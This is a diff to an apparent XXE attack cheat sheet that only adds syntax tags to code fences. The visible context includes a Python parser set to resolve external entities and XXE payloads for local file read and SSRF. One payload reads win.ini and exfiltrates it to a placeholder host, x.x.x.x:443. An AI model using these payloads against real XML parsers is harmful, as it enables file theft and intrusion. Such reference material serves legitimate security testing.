@@ -8,7 +8,7 @@ tags:
 
 Testing with python:
 
-```
+``` python
 doc = etree.parse(open('/tmp/tmp.xml'), etree.XMLParser(resolve_entities=True,no_network=False))
 ```
 
@@ -16,7 +16,7 @@ doc = etree.parse(open('/tmp/tmp.xml'), etree.XMLParser(resolve_entities=True,no
 
 Basic Local File Read
 
-```
+``` xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ELEMENT foo (#ANY)>
@@ -25,7 +25,7 @@ Basic Local File Read
 
 Exfiltrate data (e.g., blind)
 
-```
+``` xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ELEMENT foo (#ANY)>
@@ -35,7 +35,7 @@ Exfiltrate data (e.g., blind)
 
 XXE + SSRF
 
-```
+``` xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ELEMENT foo (#ANY)>
@@ -44,7 +44,7 @@ XXE + SSRF
 
 XXE using External DTD
 
-```
+``` xml
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -55,14 +55,14 @@ XXE using External DTD
 ]>
 ```
 
-```
+``` xml
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
 ```
 
 External DTD handling tags:
 
-```
+``` xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
 <!ENTITY % start "<![CDATA[">
@@ -74,7 +74,7 @@ External DTD handling tags:
 <root>&all;</root>
 ```
 
-```
+``` xml
     <!ENTITY all "%start;%stuff;%end;">
 ```
 
